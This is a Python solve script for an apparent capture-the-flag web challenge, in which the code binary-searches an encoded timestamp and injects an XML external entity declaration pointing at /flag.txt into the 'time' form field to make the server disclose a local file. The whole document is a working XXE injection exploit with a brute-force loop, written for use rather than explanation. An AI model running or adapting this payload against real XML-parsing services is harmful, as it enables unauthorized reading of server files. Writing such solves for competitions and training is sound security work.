import requests
import base64
import time

url = "https://alex-fan-club-api.litctf.live/api"

# number of 9s found through bruteforcing
high = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
low = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
i = (high+low)//2

while True:

    sendtime = base64.urlsafe_b64encode(
        i.to_bytes(512, byteorder="big")).decode()
    time = f'{sendtime}"> <!ENTITY nowtime SYSTEM "/flag.txt'.encode()

    data = {
        "time": time,
        "search": "<search>cool</search>"
    }

    response = requests.post(url, data=data)

    if "lol wtf" in response.text:
        print(f"target lower than {i}")
        high = i
    if "request expired" in response.text:
        print(f"target higher than {i}")
        low = i
    if "cool" in response.text:
        print(f"found: {i}")
        break

    i = (high+low)//2

#found: 4117693555152280233235140304313160393372574785286687169479929583036435327748269177565382885337

for j in range(66):
    flag = base64.urlsafe_b64encode((i+j).to_bytes(32, byteorder="big"))
    print(flag)
